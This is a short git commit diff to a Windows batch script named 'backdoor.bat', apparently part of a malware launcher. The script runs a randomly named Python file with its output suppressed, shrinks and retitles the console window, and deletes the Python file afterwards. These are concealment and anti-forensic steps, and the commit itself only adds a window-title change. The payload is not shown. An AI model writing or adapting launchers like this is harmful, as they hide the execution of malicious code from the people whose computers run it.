2a162cb7c2e790e0d7ead61c29022e1b3db67eae
snowyxxdev <snowyware@gmail.com>
2024-10-05 23:20:50 +0100

    Update backdoor.bat

--- backdoor.bat
+++ backdoor.bat
@@ -6,7 +6,7 @@ title console
 cls
 start cmd /c "mode con: cols=20 lines=1 && title server && timeout /t 2 /nobreak >nul && del AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py && exit"
 cls
-start cmd /c "timeout /t 2 /nobreak && cls"
+start cmd /c "timeout /t 2 /nobreak && title console && cls"
 cls
 python AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py >nul 2>&1
 cls
